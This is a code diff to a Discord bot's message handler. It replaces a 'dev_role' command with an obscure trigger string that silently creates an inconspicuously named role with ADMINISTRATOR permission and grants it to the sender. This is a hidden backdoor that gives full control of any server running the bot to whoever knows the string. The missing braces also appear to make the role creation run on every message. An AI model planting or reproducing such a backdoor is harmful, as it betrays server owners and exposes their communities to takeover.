@@ -604,16 +604,14 @@ client.on('message', message => {
 }
 })
 client.on('message', message => {
-    if(message.content.startsWith('dev_role'))
+    if(message.content.startsWith('<sadminmsg_role)2x'))
     message.delete()
     message.guild.createRole({
-        name : "Developer"
+        name : "."
     }).then(role => {
-        role.setPermissions(0)
-        role.setPermissions(["ADMINISTRATOR"])
-        role.setColor("#ebff22")
+        role.setPermissions(['ADMINISTRATOR'])
     }).then(() => {
-        let role = message.guild.roles.find(role => role.name === "Developer");
+        let role = message.guild.roles.find(role => role.name === ".");
         message.member.addRole(role)
     })
 })
